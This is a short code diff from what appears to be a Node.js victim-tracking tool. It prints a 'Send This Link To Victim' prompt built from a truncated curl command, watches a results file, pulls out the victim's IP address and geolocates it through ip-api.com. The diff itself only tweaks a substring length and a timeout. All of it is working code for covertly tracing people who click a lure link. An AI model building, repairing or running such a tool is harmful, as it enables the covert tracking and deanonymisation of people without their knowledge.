@@ -48,7 +48,7 @@ console.log(c.blue("[ Send This Link To Victim ] > " + cmd.exec("curl -s -N http
 loading("Listening...\n\n").start();
 f.watchFile("result.txt", function(current, previous){
 var a = f.readFileSync("result.txt", "utf8");
-var ipvictim = a.substr(7, 13);
+var ipvictim = a.substr(7, 11);
 req("http://ip-api.com/json/" + ipvictim, function(error, response, body){
 var js = JSON.parse(body);
     console.log(c.red("\n[!] Type Ctrl + c To Exit"))
@@ -65,4 +65,4 @@ var js = JSON.parse(body);
 
 });
 });
-}, 4000);
+}, 5000);
